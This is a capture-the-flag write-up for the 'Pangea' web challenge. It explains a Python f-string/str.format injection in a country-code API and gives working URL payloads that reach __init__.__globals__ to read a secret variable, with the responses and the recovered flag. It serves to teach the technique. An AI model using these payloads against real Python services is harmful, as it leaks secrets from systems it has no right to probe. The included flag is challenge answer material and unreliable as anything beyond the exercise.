<h1>Pangea</h1>
<p>500 points</p>
<p>Web,
5 Solves as of Solving</p>
<h2>Description</h2>
<p>I wrote an API to retrieve country codes. Can you help me test if it's secure?</p>
<h2>Given</h2>
<p>main.py</p>
<h1>Solution</h1>
<p>This is an injection question of Python's f-strings and format syntax.
The idea is to inject something (lower CAPS) into <code>f'{{{country.lower()}.code}}'.format(**countries)</code> such that you can read the flag variable into the local namespace
1. The outer <code>{{</code> and <code>}}</code> will be condensed into <code>{</code> and <code>}</code> respectively through the f-strings
2. The <code>{country.lower()}</code> would be  replaced by the string
3. After that you are left with <code>{&lt;string&gt;.code}</code>, which will then be matched to the list <code>countries</code> to get the country code</p>
<p>So what we can do is this
1. Inside our string , we can put in some escape characters <code>}</code> and <code>{</code> such that we pass in the string <code>&lt;variable to read&gt;} {&lt;normal country&gt;</code>
2. After f-string formatting, we would be left with <code>{&lt;variable to read&gt;} {&lt;normal country&gt;.code)</code>, which would parse perfectly as an f-string</p>
<p>Let's test it out! The examples below are running on a local modified copy of the server, where I added some print statements for debugging.</p>
<h2>Tests on localhost</h2>
<p>Try this: <code>/api/v1/{flag}}{tokelau</code>
<code>{
  "Code": "{flag}TK", 
  "Name": "{flag}}{tokelau"
}</code>
With this we proven that we can add ome other text besides the country name. Maybe it's possible to read some undesired variables?</p>
<p><code>http://localhost:5000/api/v1/tokelau%7D%7Btokelau</code>
<code>{
  "Code": "&lt;__main__.Country object at 0x7f198da65438&gt;TK", 
  "Name": "tokelau}{tokelau"
}</code>
With this it may be possible to inject code to read the flag variable. If we get around the formatting accessing the country objects.</p>
<p>After searching around, I found out there is a way to access global objects. https://python-forum.io/Thread-str-format-security-vulnerability
So lets' try doing it by injecting this<code>tokelau.__init__.__globals__[flag]} {tokelau</code></p>
<p><code>http://localhost:5000/api/v1/tokelau.__init__.__globals__[flag]%7D%7Btokelau</code>
<code>{
  "Code": "You did it locally! Go and do this on the actual websiteTK", 
  "Name": "tokelau.__init__.__globals__[flag]}{tokelau"
}</code></p>
<h2>Running on the actual thing</h2>
<p><code>http://challenges.csdc20t.ctf.sg:10045/api/v1/tokelau.__init__.__globals__[flag]%7D%7Btokelau</code>
<code>{"Code":"CTFSG{BR0K3_TH3_AP1_OwO}TK","Name":"tokelau.__init__.__globals__[flag]}{tokelau"}</code></p>
<h1>Flag</h1>
<p><code>CTFSG{BR0K3_TH3_AP1_OwO}</code></p>